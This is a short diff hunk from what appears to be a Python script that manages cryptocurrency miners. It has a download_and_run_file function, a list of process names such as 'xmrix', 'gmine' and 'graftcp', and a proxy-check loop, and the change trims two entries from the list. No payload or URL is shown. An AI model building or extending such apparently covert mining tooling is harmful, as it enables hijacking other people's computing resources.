@@ -84,7 +84,7 @@ def download_and_run_file():
         print(f"Error downloading/running file: {e}")
 
 if __name__ == "__main__":
-    process_list = ['me.py', 'mecp.py', 'gas', 'graftcp', 'graftcp-local', 'xmrix', 'lol', 'gmine', 'bzme', 'cape']
+    process_list = ['gas', 'graftcp', 'graftcp-local', 'xmrix', 'lol', 'gmine', 'bzme', 'cape']
     
     while True:
         if check_proxy():
